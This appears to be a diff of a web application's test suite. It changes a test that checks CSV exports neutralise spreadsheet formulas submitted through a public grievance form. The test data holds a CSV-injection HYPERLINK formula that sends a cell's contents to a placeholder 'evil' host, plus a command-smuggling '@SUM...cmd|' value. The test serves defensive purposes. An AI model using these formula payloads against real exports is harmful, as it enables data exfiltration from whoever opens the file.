@@ -105,7 +105,7 @@ test('X-Forwarded-For does not bypass rate limits when no proxy is configured', 
 
 test('CSV exports neutralise spreadsheet formulas from public submissions', async () => {
   const c = client(HA);
-  const r = await c.form('/apply/grievance', { name: '=HYPERLINK("https://evil/?d="&C2,"x")', phone: '9841000011', subject: '@SUM(1+1)*cmd|x,y', description: 'd', category: 'service' });
+  const r = await c.form('/apply/grievance', { name: '=HYPERLINK("https://evil/?d="&C2,"x")', phone: '9841000011', email: 'csv@example.com', subject: '@SUM(1+1)*cmd|x,y', description: 'd', category: 'service' });
   assert.equal(r.status, 302);
   const adm = client(HA);
   await adm.form('/admin/login', { username: 'admin', password: PW });
